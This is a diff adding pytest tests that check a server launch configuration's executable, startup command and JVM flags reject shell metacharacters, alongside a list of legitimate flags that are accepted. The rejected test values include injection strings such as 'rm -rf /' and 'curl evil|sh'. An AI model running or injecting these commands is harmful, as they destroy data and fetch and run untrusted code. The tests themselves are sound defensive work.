@@ -2,6 +2,7 @@ from __future__ import annotations
 
 import pytest
 
+from app.core.exceptions import InvalidValueError
 from app.modules.server.domain.value_objects import (
     JavaArguments,
     LaunchConfiguration,
@@ -348,3 +349,62 @@ class TestLaunchConfiguration:
         lc = LaunchConfiguration(startup_command=["bash", "run.sh"])
         with pytest.raises(AttributeError):
             lc.java_executable = "other"  # type: ignore
+
+    def test_launch_configuration_validates_executable(self) -> None:
+        for bad_exec in ["java; rm -rf /", "sh -c evil", "../../bin/evil", "", "   "]:
+            with pytest.raises(InvalidValueError) as exc_info:
+                LaunchConfiguration(java_executable=bad_exec)
+            assert exc_info.value.details.get("field") == "java_executable"
+
+        # Legitimate Windows path with spaces and backslashes accepted
+        win_exec = r"C:\Program Files\Java\bin\java.exe"
+        lc = LaunchConfiguration(java_executable=win_exec)
+        assert lc.java_executable == win_exec
+
+    def test_startup_command_rejects_metacharacters(self) -> None:
+        with pytest.raises(InvalidValueError) as exc_info:
+            LaunchConfiguration(startup_command=["bash", "run.sh;evil", "nogui"])
+        assert exc_info.value.details.get("field") == "startup_command"
+
+    def test_jvm_flags_rejects_metacharacters(self) -> None:
+        with pytest.raises(InvalidValueError) as exc_info:
+            LaunchConfiguration(jvm_flags=("-Xmx2G", "-Xms1G;curl evil|sh"))
+        assert exc_info.value.details.get("field") == "jvm_flags"
+
+
+class TestJavaArgumentsSecurity:
+    def test_java_arguments_accepts_legitimate_flags(self) -> None:
+        legitimate = [
+            "-Xmx4G",
+            "-Xms1024M",
+            "-XX:+UseG1GC",
+            "-XX:-OmitStackTraceInFastThrow",
+            "-Dterminal.jline=false",
+            "--add-opens=java.base/java.lang=ALL-UNNAMED",
+            "-javaagent:plugins/spark.jar",
+            r"-javaagent:C:\agents\spark.jar",
+            "-Xlog:gc*:file=logs/gc-%t.log",
+        ]
+        ja = JavaArguments(legitimate)
+        assert ja.as_list() == legitimate
+
+    @pytest.mark.parametrize(
+        "bad_arg",
+        [
+            "-Xmx1G;curl evil|sh",
+            "-Xmx1G$(id)",
+            "-Xmx1G`id`",
+            "-Xmx1G\nrm -rf /",
+            "-Xmx1G & calc",
+            '-Xmx1G"&&id',
+            "-Xmx1G'||id",
+            "-Xmx1G>out",
+            "-Xmx1G<a",
+            "not-starting-with-dash",
+        ],
+    )
+    def test_java_arguments_rejects_shell_metacharacters(self, bad_arg: str) -> None:
+        with pytest.raises(InvalidValueError) as exc_info:
+            JavaArguments([bad_arg])
+        assert exc_info.value.details.get("field") == "java_args"
+
